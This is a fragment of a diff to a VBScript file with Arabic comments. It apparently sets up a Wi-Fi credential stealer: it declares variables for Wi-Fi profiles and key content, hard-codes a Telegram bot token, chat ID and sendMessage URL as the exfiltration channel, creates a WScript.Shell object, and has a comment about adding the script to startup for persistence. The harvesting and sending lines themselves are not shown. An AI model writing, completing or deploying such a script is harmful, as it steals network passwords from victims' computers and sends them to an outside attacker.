@@ -1,3 +1,4 @@
+' تعريف المتغيرات
 Dim objShell, objExec, objHTTP
 Dim wifiProfiles, profile, command, result, message, keyContent
 Dim botToken, chatID, apiURL
@@ -8,6 +9,7 @@ botToken = "7767663744:AAGYWE07FTXmx6tBcTe80JnX5KMdb35iyoc"
 chatID = "5792222595"
 apiURL = "https://api.telegram.org/bot" & botToken & "/sendMessage"
 
+' إنشاء كائن Shell
 Set objShell = CreateObject("WScript.Shell")
 
 ' إضافة السكربت إلى بدء التشغيل
